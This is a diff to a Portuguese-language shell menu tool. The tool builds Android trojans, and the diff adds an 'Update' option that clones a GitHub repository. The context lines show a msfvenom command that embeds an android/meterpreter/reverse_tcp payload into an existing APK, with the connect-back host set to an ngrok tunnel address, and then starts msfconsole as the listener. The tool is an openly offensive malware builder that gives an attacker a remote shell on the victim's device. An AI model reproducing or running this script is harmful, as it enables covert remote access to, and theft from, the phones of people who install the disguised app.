@@ -16,7 +16,8 @@ menu()
 clear
 echo "1-Instala Ngrok"
 echo "2-Cria trojan"
-echo "3-Cria trojan 'apk-original' \n"
+echo "3-Cria trojan 'apk-original' "
+echo "4-Update \n"
 echo -n "Escolha uma opcao? \n"
 read resp1
 
@@ -47,6 +48,12 @@ echo -n "LPORT = "
 read port1
 msfvenom -x $apk --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port1 -o trojan.apk
 msfconsole -r trojan.rb
+fi
+if [ "$resp1" = "4" ]
+then
+git clone https://github.com/noobfoda2/tool
+echo " "
+echo "\033[42;1;37m \033[0m update success "
 fi
 }
 menu
